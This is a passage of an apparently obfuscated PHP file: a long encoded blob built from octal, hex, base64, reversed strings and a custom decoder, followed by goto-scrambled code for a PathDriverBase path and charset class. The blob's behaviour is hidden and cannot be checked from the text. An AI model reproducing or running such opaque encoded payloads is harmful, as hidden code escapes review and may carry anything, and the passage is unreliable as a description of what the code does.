ì-’š').strrev('BÒP]XäšØ…^ô²W–»p]åP“©DİB6a³áL+áyrè_åÊTBì^'."\0".'šbó_S')."\76\355\110\253\51\107\74\127\160\230\152\52\5\377\161\200\61\164\24\22\111\207\121\112\73\224\224\74\341\30\127\342\5\352\164\132\157\162\50\172\312\61\232\114\70\222\11\335\221\4\5\344\365\161\107\136\111"."\x39\x34\x0\xd7\xc7\x9b\x1c\x5\x10\x36\x0\x4c\x6\x7f\x86\x4e\xdc\x2c\x94\xd4\xa4\xa2\x81\x4d\x91\xa1\x65\x8b\x48\x65\x69\x62\x1a\xf8\x24\x15\x83\x28\x64\x99\xa5\x17\x2\x5d\xbe\x6\xd7\xb2\x10\x4b\x9d\x70\x4c\x93\x60\x2f\x66"."\371\267\26\63\151\51\146\271\275\30\61\321\107\275\205\57\306\103\102\343\370\141\51\71\13\275\217\223\377\46\162\5\27\374\103\142\204\2\21\35\150\314\27\103\357\3\202\316\201\213\42\242\253\224\111\56\214"."\150\272\12\304\145\271\162\105\202\366\104\103\113\231\343\114\371\111\104\15\223\24\241\156\244\42\54\205\304\215\162\114\113\53\64\75\302\236\136\211\253\346\0\330\100\313\134\33\20\217\46\200\33\261\2\64\171"."\x14\x92\x20\x10\x60\xf\xa8\x13\xd4\xfa\x78\xb1\xb\x5f\xba\x72\xfc\x2\x4c\x74\x30\xb8\x2e\x8f\xdb\xd2\x8\x11\xda\x26\x41\xe5\x9\x2\xca\x81\xb3\x83\x16\x6\x4f\x34\x63\xf0\x40\x53\x68\xd9\x62\x57\xa0\xc7\x17\x72\xa1\xf2\x90"."\165\34\377\66\274\111\324\105\123\173\374\121\46\140\63\304\164\126\213\313\331\30\56\203\137\110\311\171\300\125\230\251\373\142\27\216\203\322\134\326\224\64\125\64\312\152\371\264\152\62\47\115\244\115\335\3\141".strrev('ÄôÇ×ÌB_ÂË©à9-ãÎp0Ç&IJP@­O¥	©)RF+|;şÎCƒ&ÿyAd¡²àÈ"•T')."\x2c\x1\x9a\x4\xcf\xb1\x41\xd7\xd1\xdc\x28\x4b\x92\xc3\x85\x82\x3c\x2\xb\x15\x8b\xc2\xac\x95\x16\x20\x32\xda\x4\xe0\x8c\xd4\xcc\xd0\x3\x8\xd\x6a\xd6\x74\x89\x3b\xf\x52\x8c\x37\xd8\x37\x30\x18\xf1\xfb\x5c\x15\x91\x28\x50"."\270\171\20\251\262\102\62\74\106\6\333\165\164\220\70\115\256\151\120\220\246\25\50\214\37\175\212\231\312\123\273\240\276\275\250\250\47\242\227\45\12\200\100\276\171\156\56\327\245\146\53\54\104\337\202\6\222"."\212\206\17\164\260\234\267\315\120\326\207\25\120\2\341\40\152\50\130\245\370\253\255\342\27\53\42\14\145\124\123\351\224\263\145\237\102\131\312\123\151\357\160\205\272\112\175\307\123\51\244\123\225\215\151\106\251"."\xc\xc5\xbf\x54\x58\x88\x49\x50\x4e\x38\xe4\xa4\x69\x38\xe4\xa2\x43\xce\xe9\xe\xb9\xa4\x3b\xe2\x5a\x7e\xd4\x91\x34\x52\xe0\xcf\x70\x80\xa5\x17\x26\xa7\xb2\x0\x31\x2b\x3b\xb2\x80\x81\x39\x72\x6a\x52\x75\xe4\x40\x40\x35\x1d\x13"."\71\207\321\234\43\213\160\256\0\22\13\315\16\55\245\73\364\121\120\244\221\201\163\143\324\61\56\227\34\343\71\331\221\233\43\73\264\164\332\121\32\113\71\306\113\216\222\226\160\230\364\354\227\212\111\61\103".base64_decode('1N4bK6qJUQh2wX/AuOQKRqyYVyeob+6cppWkXCmT/Hf42IO2HR8LJYDv6ZoxKruQFpGi25cjlj5M').base64_decode('ENZCNTsw2nKh4AACTRJsO5GZ6Ig9J6/PMFsFqapSDEpqYg5cGfoJLCcIChgwEa9cMd1y/M38ZsDj')."\x14\x51\x44\x25\x22\x17\x28\x8e\xfa\x9f\xc1\x2b\xa3\xa0\x27\x8f\x51\xa6\x5b\x19\xed\x9f\xb7\x80\x86\x81\xbc\x5d\x6a\x5c\xb\xff\x6d\x5a\x2b\x3\xde\x5a\xd2\xf4\xb8\x6a\xd0\x67\x94\x58\xd3\x47\x44\x61\xf3\x3f\xcf\x24\x32\xc3\xff".base64_decode('IheXT9NKXv+vvypkmlSoncp/np3nAR1FTZv/i46CmWLii2YEyXAV1ATk1K4GF78vQWINnXtzwCwt')._kodDe('LUMq0WQcRVpyY0el1YkDm8LANNOGzX/6WZH1jb3k9HUBEQYLAxrUaCPEjH8+ZdcSsnp0SBD48jxBGg==')."\107\336\50\71\300\354\7\377\217\233\240\70\360\233\3\262\110\16\112\350\71\40\252\227\250\327\63\260\160\52\246\354\322\362\360\215\1\350\201\337\65\16\217\356\34\323\11\327\345\370\31\164\362\126\236\141\362"."\277\145\3\16\353\204\115\220\103\265\230\140\72\360\37\263\10\133\131\70\131\50\11\327\26\355\141\204\31\271\330\105\132\201\245\104\230\340\140\362\47\107\43\231\341\125\113\42\226\325\264\321\142\101\140\5\70"."\25\357\262\15\327\160\103\343\332\306\21\27\237\336\377\16\23\27\373\357\260\20\143\20\220\170\317\140\164\224\36\373\366\52\222\57\11\31\204\75\44\347\233\234\137\256\25\371\345\132\302\354\106\54\302\257\235".base64_decode('OBjXhQmwE+hZKPkt47rDOtgzivOqwu6BiFyUGdNX2S0VYZPvW7BsbN7C3C0sOscWb8tOuAyMBgWH')."\xcb\xf8\xb9\x9e\xc8\xa8\xf4\xd6\x9\xdd\x9a\x70\xc1\xbf\x98\xa7\x5b\x3\x25\x29\xc8\xfb\xf4\x79\x7a\xe1\x71\x1c\xd0\x22\xb0\x43\x83\xce\x45\x18\x8\x74\xa2\xf0\x26\x86\xa0\x3d\xa5\x31\x9\x5\x4d\x16\x1c\xec\xee\xd\x76\x7a\x90".base64_decode('P4BYT5A+79zW1o6OjNnL1IBenOBDafbU4pCsQwUGR4SotUkkVdLy7FqLnIuNY1QcGegZiHkGIz2C')."\117\5\6\32\40\32\70\350\35\153\10\11\206\2\53\74\334\203\122\134\66\350\171\321\320\320\220\23\236\267\103\43\220\4\172\2\273\23\46\112\220\21\346\332\252\106\265\144\42\253\25\223\125\274\100\167\243"."\xab\x41\x9a\xd3\xd0\x28\xd\xe6\xa9\xfa\x23\xdd\x1e\xd1\x77\xcd\xf3\x9a\x53\x78\x90\xd0\xf6\xb2\xb9\x35\xd1\xf2\xe8\x2e\xfd\x38\x4e\x2\x7b\x9\x40\x56\xc2\x8e\x39\x58\x52\x74\x41\x93\x9f\xbe\x23\x4d\x7e\xfb\x82\x4b\x89\x86\xae"."\67\70\100\316\17\372\226\60\75\24\237\122\240\102\263\267\354\201\142\244\72\63\221\313\56\142\212\71\302\251\150\253\257\245\240\153\205\224\232\117\112\0\47\157\264\370\332\252\174\236\245\55\125\355\40\111\316"."\146\141\252\344\156\157\165\163\104\62\142\3\241\340\100\127\200\171\123\30\200\103\100\216\307\310\343\350\364\235\173\362\51\213\16\167\25\350\351\52\256\303\135\205\352\124\45\121\227\153\310\52\6\7\33\233\210"."\313\101\321\134\224\350\101\102\263\57\241\37\140\224\131\216\40\2\361\371\241\321\274\100\36\31\166\12\156\63\127\300\100\142\61\327\43\132\314\201\216\200\353\23\274\41\207\275\12\73\46\1\325\205\320\244\301"."\135\143\111\147\271\322\212\111\156\145\21\34\326\56\351\206\353\216\23\77\370\256\351\223\60\263\15\255\342\107\251\326\23\62\270\347\167\314\344\352\232\314\162\301\340\226\33\13\307\231\21\1\50\22\335\327\331"."\x6\x9a\x44\xc3\x6d\x55\xc4\xa2\x8e\xce\xb\xc8\xc\xab\xda\x31\xdf\x6b\xd\xb7\x28\x13\x70\x50\x41\x93\xdb\x83\xe8\x31\xe8\x7e\xcd\x44\x6a\x4f\xad\x6e\x31\xd\x20\x2\xae\x61\x80\xd\x70\x3b\x1b\x2e\x88\x41\x81\xa8\x38\xd8\x6a".base64_decode('VJV2K9HC/XqLxF7y5hRbNFOEYJfK+mSLVOFF8GxF/W8TlUiYWF+k4qSF5kCgam0L5s1paHDkiobp').base64_decode('1BXry6ywoyRyftgXduKJ7VyqAn7go4bF6GH2FolMBIdE5wcODXgi3h6HhIjVIXX7IwA8CP7B2vcO').base64_decode('Cc5rkAzmuUOCZr0OabAf/3LNadB3mCyQ3QvqShCHFE2Jxk2iJAnOWKgeQ3odA+iI5lqG1HxzE1Sc').strrev('TÑx™		•@¥ÿÿ·µAk'."\0".'—ÿüÈ½ZÏP-@N¨¬U€MNg.Áo¢ÇpˆNŸp=–Æ').base64_decode('jP+qDMrgWFdhtaJ2sio0Sk0NDVJwCUQjKfsKuWgnE16Ax4es0lg9IymX6NuvGTjJ1HyBukhEjAoM').strrev('LA[¹‚¾‚Ù,¬ÄÆv0)/mp¬“¼€dÜ$óÅChÉ©ÊIa¤Öáb åÖi¡üÄ(h|').strrev('ÖaBˆ¢àl”¸–DaóÆstno¦‡æ“¡^xÚa6ñX©ğóWjp“ĞÆœlq…'."\0".'Ñlò').strrev('¹,eJOÀNÄ¿A"Ñ'."\n".'ñåœè#9µ¯„‹‚äe®–X£¶F&Q›XK6Å¼TV<‚´+:v§CAV')."\214\26\340\200\116\313\23\247\135\304\277\165\145\305\132\270\164\141\105\304\206\203\313\234\376\211\2\250\243\222\4\53\65\330\260\117\132\154\150\335\53\261\231\4\276\266\253\253\165\322\0\363\5\104\156\171\210"."\xa9\x7d\x9\x2d\x53\x84\x49\x43\x69\x94\x84\x4b\x60\x3e\x40\x5f\xa2\xc9\x46\x3b\xa0\x89\x62\x6b\xa9\x14\x3c\x8e\x20\x31\x82\x85\xf6\x93\x34\xb\xde\x2c\xd2\x58\x21\x2b\xe7\x15\x83\xc6\x40\x56\x51\xb0\x5d\x2a\x66\x5c\x6a\xcd\xc8".base64_decode('UGmycLYuVj2G7QcJZCJWULL4sARZdlH45DTwRFaHTseSYlzNwStGmVVSByI74EajFCetK0reAoln')."\x8b\x8a\x5\x20\x67\xb\x19\x19\x41\x30\x80\xbc\xfb\xe0\x8d\xbb\xbd\x69\xb7\x57\x77\x7b\xc9\x56\x7b\x57\xfc\xb3\x1b\x49\x26\xab\x16\x71\xa7\x44\x5f\x8b\x40\xd\xc4\x3b\x69\xe8\xe8\x25\xad\xa6\x2a\xc2\xe1\xd5\x5c\xc5\x84\x2\x95"."\352\306\271\306\116\106\320\245\21\320\341\145\65\272\223\20\122\102\232\311\326\126\156\156\203\222\122\131\252\346\25\350\353\216\165\365\6\6\142\110\304\17\366\107\74\275\266\4\300\63\43\1\157\31\270\63\110"."\135\275\332\152\35\317\131\325\320\324\74\132\346\7\270\313\32\20\225\15\346\352\224\170\20\44\171\240\116\77\16\56\152\215\353\156\152\71\30\27\66\74\106\116\316\62\205\46\67\325\63\167\323\107\16\250\47"."\223\336\0\231\73\156\262\277\353\125\343\324\200\307\333\273\2\64\1\72\234\10\206\74\241\345\334\21\56\110\211\170\102\323\244\300\74\304\167\34\165\147\266\150\361\342\305\364\15\320\104\26\233\32\102\335\176".strrev('|oÈ\'~O™—¸&œvlËÒ(^^ªè¨“L-B¸¨-Áî²CÛîXñÙ-P˜åÊ‡)Iôğ _v')."\212\372\332\327\211\356\100\102\246\157\233\320\307\32\322\123\120\365\215\206\301\112\223\345\347\230\110\31\170\104\362\312\371\152\123\12\2\264\105\122\37\64\44\312\247\245\51\320\162\354\334\330\340\116\61\214\214"."\222\315\306\240\312\33\251\156\42\243\111\366\15\44\215\116\377\15\136\14\1\27\251\276\6\144\236\240\202\144\122\221\231\54\334\366\163\27\20\304\14\316\345\42\112\74\320\163\0\140\46\126\44\344\260\222\272".strrev('AEªÁ°’Õ4ø3è=ßeuEÄBG!$X™RJ×Ø-l2Ih–Wn,Ì‚Òà’RP†¿çÀ1Ç@')."\43\224\101\132\54\172\206\70\241\274\302\263\32\32\33\4\123\214\200\327\37\216\235\20\206\56\62\173\3\324\215\213\65\41\0\322\42\241\151\122\74\241\351\122\202\235\47\114\223\342\245\373\7\153\112\157\60"._kodDe('MgIE8imWxSQj5AwQ8U/nYqTzv+YeZ/Pr9f52evZK/hHYOdbOvXKYwCVzNlWr5/USEiioe3lcuC9EJw==')."\x34\x1c\x96\x12\x32\xb6\x66\x89\x2b\x58\x2a\x50\x92\xd0\x27\x28\xac\x9d\x64\x0\x59\x99\x72\xf2\x19\xd0\xe1\xaf\xdb\x5d\xe3\xaa\xaf\x9d\x39\x23\x27\xc2\xa2\x75\x10\x18\xad\x73\xcf\x18\x24\xd5\x98\xc1\x61\x0\x61\x26\x83\xbb\x57"."\326\124\255\255\256\165\325\325\104\33\153\231\372\126\224\232\200\105\243\105\242\374\64\262\146\316\72\356\176\60\72\354\252\213\216\314\24\264\311\326\0\300\72\6\30\317\320\363\60\344\311\201\141\31\165\65\303"."\x55\xd5\x23\xae\xba\xe1\x95\xd1\xe8\x8\xc\xd6\x2\x58\xb\x84\x47\xc3\xae\xba\x5a\x47\xc7\x4c\xf7\xa0\x6a\x88\xf8\xd8\x89\xf2\xb4\x38\xa4\xcb\xa9\x11\x58\x81\x1d\xee\x43\x91\x45\x5\xbb\x24\x64\x2\x21\xea\xd3\xe\xf8\x1\x53"."\x16\x5c\xb4\x99\xb9\x82\x40\xb6\xd0\x8b\xd8\xbc\x39\xa2\x46\x39\x86\xd0\x25\xa5\x48\xd7\x3e\x14\xa4\x56\x57\x5\xae\x59\x6f\x55\xa6\x65\x51\xcb\x6c\x69\x90\x3a\x81\xa8\x66\xb1\xe\xb6\xf8\x91\x13\x6a\xa7\xd7\xb\x5\xc5\x44\xef"."\211\10\42\76\305\1\343\302\23\252\102\135\201\274\46\70\71\201\5\121\47\100\104\20\220\215\314\64\136\161\260\203\12\320\0\241\116\210\265\270\340\206\137\130\150\173\154\336\235\310\66\252\274\17\161\30\20"."\62\231\132\10\17\174\12\355\153\250\337\16\256\50\76\36\47\75\0\373\70\146\373\40\63\62\316\12\333\121\256\3\203\244\11\256\205\105\243\124\104\112\310\5\170\137\223\304\47\343\240\343\311\267\131\150\160"."\0\372\124\203\234\40\106\317\120\5\120\240\77\20\13\7\126\370\313\22\240\73\340\312\51\140\275\217\4\250\370\43\300\373\203\310\215\231\5\76\330\277\244\77\70\124\11\65\322\67\300\145\11\41\311\353\351".strrev(' É	ïÈ'."\n".'¤¯Cdƒéî>;÷OÔ¦N—sæºÌYQ{ÜÆi³Šnh„ö-P­Û-€¬Ş)=„Ä')."\x9e\xe2\x88\xc9\xe\xa9\xe2\x19\xe\xdb\x50\xe9\x72\xde\x48\x29\xba\xed\x78\x32\xae\xe6\x65\xea\xd0\x34\x47\xbf\x9d\x63\x66\x6c\xd0\xf9\x11\x75\x18\x83\x4c\xce\xa8\x64\x20\xde\x5d\x17\xd8\x5\x20\xb1\xf3\xd2\x41\xaa\x9e\x84\x46"."\111\302\231\135\336\14\51\151\61\332\253\61\235\75\264\232\127\50\2\76\167\43\330\226\300\115\212\47\141\26\305\147\165\204\67\323\101\114\170\277\136\260\257\163\66\112\254\105\61\134\62\216\324\13\11\130\123".strrev('ĞiÁe–o ³-æLŸ'."\r".'1``— …úœÑ%C^£ª3bëó8ÅÃæëıÉâ½öÍ‚¼')."\xea\x8c\xb3\x32\x31\xc5\x80\xa\x59\x83\x54\xec\xaa\x94\x52\xe1\x53\x28\x49\xe8\xd1\x4\xdd\xc7\x91\xa5\x88\x74\xe2\x72\xde\x57\x26\xed\xef\x26\x67\x33\x71\xfa\xa1\x89\x1e\xde\xb0\xcd\x1a\xe9\x5c\x67\x93\x24\x90\x17\xe4\x3d\x2"."\105\340\323\10\326\215\334\12\63\313\161\64\350\263\100\60\115\342\126\176\370\15\33\66\264\350\261\33\26\323\5\13\60\45\111\207\16\75\26\123\161\55\301\100\364\232\114\105\33\51\334\131\60\331\147\361\30"."\x69\x43\x0\x53\xde\x9a\x8e\xbe\x68\xa9\x8c\x35\x83\x8e\x3d\xe8\xf9\x14\xee\x50\x3\x65\xe1\x75\xe6\x8e\x36\x1\x8\xec\x73\xd0\x83\x31\xbc\x13\xb8\x1f\x36\xfc\x12\xe\xf5\x15\xea\x49\x26\xed\xe0\x88\xc6\x80\xe5\xbe\xdc\x5c\xcc"."\xcb\x29\xf1\xb2\xe\x36\xa0\xe1\x40\xb0\xbf\xa6\x16\x4a\x54\x16\xdb\xfd\xbe\x49\xe6\x7\x1b\x8c\x1a\x5a\xb3\xfb\xe4\x9\x3e\x28\x2c\x42\x53\x19\x4d\x1a\x96\x8\xf6\x4c\x68\xc9\xcd\x40\xc\x6b\x5c\x89\x33\x16\x4d\x98\x66\xcf\x80"."\233\201\72\151\67\261\147\117\210\65\63\164\72\57\26\32\44\362\351\70\66\201\42\174\263\205\71\153\244\333\237\361\234\232\220\172\203\335\160\357\355\13\204\227\110\151\305\224\270\320\203\56\51\254\263\34\71"."\x5e\x40\x87\x7a\x94\xc8\xe3\x54\x85\x5\x5\x9d\xe8\x0\xc4\x69\x71\x97\xc3\x76\x24\xa2\x17\x47\x58\x50\x59\xc1\x78\xd4\xc5\xe2\xe0\xe9\x89\x33\xc9\xac\x5b\x6d\xb8\x54\x48\x28\xcb\x21\x7e\x5f\xc8\x3\x77\x34\x56\xbe\x80\xc0\x64".strrev('¨¼‡ãÌŠfS¾Êİfù7yĞ¦¢_Y~"“UÚyO•'."\r".'R_5B\'gåŸ‚]ğ¬]¿•'."\0".'÷Rg-c¯')."\x25\x18\xbd\xe2\x21\x11\x1f\x92\x13\x56\x3\xe8\x70\x0\x2c\xb5\x5c\xd7\xad\x40\xdd\xa7\x90\xeb\x75\x4a\x1b\x24\x2a\xdc\x54\x5b\x5e\x9c\x23\xc9\x60\x27\x28\xab\x94\xd4\x71\x58\xc8\x11\xa\x74\xf7\x44\xa6\x2b\xae\xc\x5b\x4d\xf2"."\347\344\154\225\121\223\124\132\144\56\242\201\214\210\312\303\132\73\226\72\101\305\4\316\73\2\76\7\172\10\214\373\44\105\101\40\117\72\340\361\26\252\200\103\170\321\12\135\22\223\151\245\152\310\362\224\230"."\157\142\130\40\30\303\317\124\341\250\333\56\42\247\220\155\50\262\56\22\234\363\270\351\221\43\163\56\15\117\236\375\23\244\352\56\223\206\40\230\33\233\302\214\364\35\52\132\131\34\265\273\130\315\130\144\344"."\162\134\220\46\161\233\170\206\40\265\111\15\310\265\2\326\247\101\367\73\255\324\221\74\154\74\266\123\106\57\203\371\163\5\323\142\303\334\243\32\374\101\10\44\46\360\355\20\224\275\264\334\144\31\300\142\44"."\337\113\253\301\274\200\102\63\222\174\112\23\133\206\130\226\37\260\6\7\12\141\333\150\7\74\251\66\7\20\21\364\52\45\305\232\175\332\262\14\73\257\147\174\332\302\30\121\104\240\43\144\224\52\70\124\247"."\277\320\375\14\223\57\141\125\4\101\204\130\55\105\311\57\345\201\366\242\301\330\170\211\126\10\45\100\30\55\113\354\123\270\32\32\251\253\203\263\165\174\33\15\100\200\15\40\113\34\201\242\151\232\60\374\130"."\x1d\x3d\x84\x7d\xe\xba\xb0\xc7\xa\x2a\x77\xa4\x55\xe6\x58\xd4\x82\x46\xc8\x1d\x6c\x11\xa6\xf5\xad\x42\xd6\x37\xec\x67\xa5\x98\xf\x60\xb7\xf2\x16\xa8\x2e\x88\xd7\xa2\x3f\x5a\xec\x51\x86\xbb\xff\x26\xe8\xe0\x6b\x3\xd8\x85\xc"."\x99\x90\x62\x91\xd4\x53\xf\xfa\x81\x2\x38\xa0\x57\x66\xdb\xec\x2e\xf7\xec\x3\x7d\x22\x32\xf1\x81\xfb\x10\x1d\xd5\x90\x14\xeb\x12\xe5\x5f\x82\x20\xb5\x4a\x74\xbe\x18\xa6\x85\x8e\xa0\xc8\x1\xa4\x11\x7\xa\x20\xe2\x14\x85\xa4"."\312\120\13\161\42\24\66\140\350\301\102\66\166\260\107\311\217\117\111\61\361\21\306\371\76\103\174\70\203\66\1\23\106\331\67\320\57\334\104\73\160\33\35\214\134\124\243\27\251\27\32\141\54\140\71\270\7".strrev('‰+©í,¬D'."\n".'3î9‹å]Àˆw+Dd÷²Ëd½cˆ]œ’-Çâ#'."\r".'aøVŸd îğ9œ,FG›>w')."\157\151\156\121\317\72\220\152\254\203\76\47\347\300\217\232\72\54\105\240\12\305\114\241\301\114\232\262\15\127\331\307\376\203\322\211\307\131\44\320\2\321\0\173\230\300\111\55\350\142\243\62\232\152\241\113\260"."\173\344\107\306\370\111\314\202\235\121\56\317\45\233\232\347\56\24\367\213\174\30\271\343\32\162\224\117\264\174\350\321\30\43\14\311\112\147\22\175\207\123\234\331\50\321\352\70\227\74\216\52\160\101\33\377\372"."\217\246\203\247\222\270\211\63\11\47\130\254\144\241\13\52\175\345\377\137\17\253\7\63\262\17\364\61\31\123\20\14\105\21\226\327\36\277\322\370\237\177\237\12\154\262\325\207\25\112\265\116\175\341\330\101\61"."\x83\xd0\xd0\x9d\x8c\x89\x20\xed\xf3\x27\x98\x84\xf5\xd\x96\xe5\x11\x45\xd8\x72\x11\x9c\xce\x1c\xae\xe3\x84\xfc\xc4\x73\x37\x19\x88\x48\x2c\x4\x23\x3c\xb0\x2a\xba\x5d\x47\x5\x45\x50\x23\xa7\x2b\x1a\xed\x1\x49\x7d\x9\xc5\xa0"."\313\162\344\364\315\323\315\74\351\303\213\104\136\5\30\343\154\302\324\170\212\51\370\170\207\214\45\310\336\73\115\46\55\42\45\210\163\253\43\201\356\223\66\240\50\3\10\363\10\320\267\52\210\205\104\136\342"."\2\10\152\250\340\310\207\154\123\171\117\171\310\204\111\72\304\147\145\101\224\21\12\341\350\144\346\41\247\272\370\263\2\377\346\254\232\207\372\251\142\76\214\10\7\62\110\214\143\211\31\121\302\203\17\10\131"."\205\32\126\13\304\145\52\321\54\256\4\44\104\262\210\240\40\345\154\120\163\27\31\314\302\74\244\367\254\63\25\65\350\133\126\42\130\34\163\352\114\42\242\213\171\141\245\23\231\351\76\142\52\241\54\207\45"._kodDe('MQ8zsUlnL6+9+4ogd4pMIuHnFYE1qbktoyFkTFm8cPVpIzcGuOWkNM8bIxvYTi0TkM5iFkKjD2+fJQ==')."\x4e\x45\x2\xde\x80\xbc\x9a\x18\xad\xe0\xb2\x7\xf6\x3f\xd4\x91\x11\x78\xa6\xb0\xd2\x94\xa1\x71\x9e\x2\x16\x24\xa6\xdb\x46\x43\x48\x76\x85\x32\xa\x79\x4d\xdb\xf2\xcc\x42\x90\xdd\xf9\xd6\x12\x77\x6f\x23\x8b\x29\x43\x80\xb3\x90"."\x1e\x26\x89\xbc\xc0\x2\x2a\xe3\x20\x11\xb\xf3\xb6\x0\x2b\x10\x1\xf4\xa3\x4e\xe9\xc1\x92\x3\x3a\x7\xea\x14\x84\x60\x8c\x64\x88\x7d\x6b\x79\x29\xa2\xdc\x83\x53\x79\x6e\x36\x27\xc5\x2c\x9c\xe9\xe3\x38\x7c\x28\xd9\xba\xbb\x14".strrev('^p³Ò>–jeŞvÂyt°L–ÙB¶9hk 7™ÒŠÄ„'."\0".'FârgÀÕN*‰6x­—›‚p´÷Æ‹')."\216\237\123\304\217\154\303\267\340\0\7\223\302\203\175\65\310\41\66\4\40\277\71\350\111\256\125\104\72\130\45\355\53\11\377\341\207\331\152\140\62\54\144\225\24\350\347\117\343\326\112\374\101\61\361\45\157".strrev('¿·2_Âc-6#Ê•c]\'f™hA#>j}ƒLô"tK¼&€†é¡-	^ßD­vÎ‡óú°:1¥Ô x').strrev('ç¸ı]ğ/©ô\\£$+Ú¢ª1—F`B½mpp‚REÍôÀˆ”T³«pÅ@ùœ$IÙex[ö`')."\4\224\214\217\332\74\45\231\351\223\330\163\15\132\304\121\341\302\41\201\50\220\357\31\120\306\70\250\45\372\307\123\120\355\71\314\214\252\47\73\325\174\322\216\137\314\307\31\224\243\203\301\350\254\4\6\2"."\x13\xe7\xd5\x36\xb8\xb0\xac\x70\x6e\x29\x97\xf8\x81\x34\x17\x10\x93\xc9\x2e\xb9\x54\x1\x95\xd9\x39\x33\x28\x80\x30\x54\x24\xfd\x8\x2f\x92\x70\x2f\xbb\xca\xb8\xf8\x75\x82\x97\x2a\x5f\x54\x20\x62\x39\x94\xbf\x58\x62\x6f\x17\x9a"."\67\14\116\356\0\362\202\13\64\102\156\34\204\237\270\147\76\356\160\121\272\206\62\312\111\356\374\16\327\221\355\345\370\47\255\17\253\60\64\46\231\1\34\244\61\356\264\100\155\216\176\341\261\26\135\136\155"."\111\144\43\51\24\137\161\277\151\41\205\136\241\70\361\32\142\332\14\341\312\37\341\364\152\355\342\260\355\362\303\306\102\71\62\135\331\64\313\200\10\14\226\65\226\140\206\304\104\113\25\355\303\215\244\176\116"."\253\30\230\103\207\115\70\315\143\115\302\370\212\255\105\142\6\173\153\161\16\275\254\317\110\236\312\237\266\177\200\166\231\375\22\220\27\42\34\275\225\335\120\106\264\12\171\160\215\52\146\303\111\60\47\27\335"."\x2c\x79\x8d\x71\xd5\x4c\x64\x2a\xe6\xc5\x49\x30\x6f\x59\x32\xcd\x2c\xec\x8e\x85\x7c\xa6\x5c\x34\xa6\x69\x5e\x79\xe7\xa1\xa9\x65\xeb\x3a\xd2\x60\xee\xa1\x5b\x40\x9d\xae\x3f\x2b\x22\x97\x7f\x8e\x10\x8f\x1d\x1b\xed\x78\x2b\xd7\xa2"."\342\356\174\272\132\124\104\236\266\26\34\333\166\31\131\211\107\322\224\12\134\221\337\35\226\363\137\236\126\341\46\23\227\11\27\347\220\105\261\257\54\131\274\26\255\174\161\32\252\70\213\15\353\215\246\15\56"."\x76\xc\x55\xd1\xd8\xbe\x61\xfd\xbb\xf7\x9e\x1b\x18\x90\x68\x40\x4\x5b\xb8\x76\x31\x3f\x9a\xa7\xbe\x8f\xc0\x17\xb8\x4f\x41\x68\xdf\xe8\xd1\xed\xfd\x47\x65\x40\x9b\x7b\x5d\x4a\x9e\xf9\xa2\xe0\xd2\xb5\xa2\x7f\x5e\x7\xdc\x2b\x97"."\157\106\263\324\63\226\350\275\30\357\130\64\123\115\10\12\25\20\50\72\340\305\351\364\43\131\176\246\105\4\10\174\117\346\23\365\203\121\155\125\370\360\72\273\213\264\134\274\125\110\167\361\63\116\213\173\147".base64_decode('9GgXs/nGKzo55cV3Ekj3hUA6J+GGy4EXSpwc1nQT2oIDZl5Av52aaVIeA8RihInkPuRqRrhpBSH+').strrev('»é3	à}xV÷ &×[`ÃvÑWu	ùP‘f¸<–Cb*pVsp#·$1ŒÀt[ì*B').strrev('\\$peşéãà¿/È¶ü«9‹DÉb˜ùG’pÊ‰Û±DÜSÃ-e#Ş(T ŸÇl')."\226\64\340\11\207\207\202\41\37\126\16\55\113\106\271\204\113\372\262\244\201\236\140\377\164\151\376\76\117\240\267\54\15\136\332\103\225\125\372\156\44\116\12\14\240\132\172\172\173\251\206\130\171\55\2\336\45"."\274\46\350\256\212\237\254\26\62\32\75\250\264\151\257\320\203\350\260\114\247\11\144\376\154\153\54\204\225\34\73\306\22\212\263\236\47\210\103\156\320\167\115\131\240\120\266\375\20\244\4\170\311\336\117\12\13"."\x51\x9f\x8c\xf0\x41\x6d\x36\xfd\x99\x28\x8c\x1a\x27\x6a\xeb\xf0\x9b\x39\x97\xe5\x6\x4f\x80\xa3\x89\x83\x98\x90\x40\x90\xe2\x1a\x8c\x0\x44\xbb\xd4\x76\x83\x62\xeb\x4c\x61\x45\x2f\xbf\x83\x43\x10\xde\x21\xb0\xde\x27\x50\x9f\xc"."\xab\xb5\xb8\x70\x36\x8b\xf9\x94\x85\x43\x89\x6a\x12\x38\x6c\x63\x60\xc9\x88\x16\x91\xd3\x84\xaf\x40\xa9\x84\xc7\x3a\x27\xc5\xb0\x78\xf0\xd1\xce\xd8\x8a\x29\xa7\xe9\x45\xb8\x9d\x15\xb\x37\xbf\xb0\x97\xfe\xf\xaa\x50\xa3\x28\x0".base64_decode('wwAA')."".""."".base64_decode('').base64_decode(''), 10, -8))); goto F‹¹á²óÍŞ; Cç¦…º¿«: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Féñä—Ä™ =& $_SERVER[Õİõş]; $this->objectDriver = array($Féñä—Ä™[57], $Féñä—Ä™[58], $Féñä—Ä™[59], $Féñä—Ä™[60], $Féñä—Ä™[61], $Féñä—Ä™[62], $Féñä—Ä™[63], $Féñä—Ä™[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($c‰¡–ĞŸëœ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($c‰¡–ĞŸëœ, $_SERVER[Õİõş][8]); } return $c‰¡–ĞŸëœ; } public function getPathName($e†‹­«…íˆ) { return $e†‹­«…íˆ; } public function iconvApp($aäˆ‡”™‚) { return $aäˆ‡”™‚; } public function iconvSystem($Eê¸œ »‡Î) { return $Eê¸œ »‡Î; } public function iconvTo($e†¥ ´²ØÛ, $fàÌÊê‹³·, $B¾§ª³ö‚³) { goto eº»ª™§óƒ; eº»ª™§óƒ: $D©ñ¥á¡Â¿ =& $_SERVER[Õİõş]; if (!$e†¥ ´²ØÛ || !function_exists($D©ñ¥á¡Â¿[65])) { return $e†¥ ´²ØÛ; } static $b£‚›Šì›³ = array(); goto F¹ÕÊÕâÃÂ; Eç¿á·Ê“µ: $d× ô›¡ªÓ = $d× ô›¡ªÓ ? $d× ô›¡ªÓ : $e†¥ ´²ØÛ; if (strstr($d× ô›¡ªÓ, $D©ñ¥á¡Â¿[69])) { $d× ô›¡ªÓ = str_replace($D©ñ¥á¡Â¿[69], $D©ñ¥á¡Â¿[70], $d× ô›¡ªÓ); } $b£‚›Šì›³[$fàÌÊê‹³· . $D©ñ¥á¡Â¿[66] . $B¾§ª³ö‚³ . $D©ñ¥á¡Â¿[67] . $e†¥ ´²ØÛ] = $d× ô›¡ªÓ; goto f¡ª®Üó³¥; 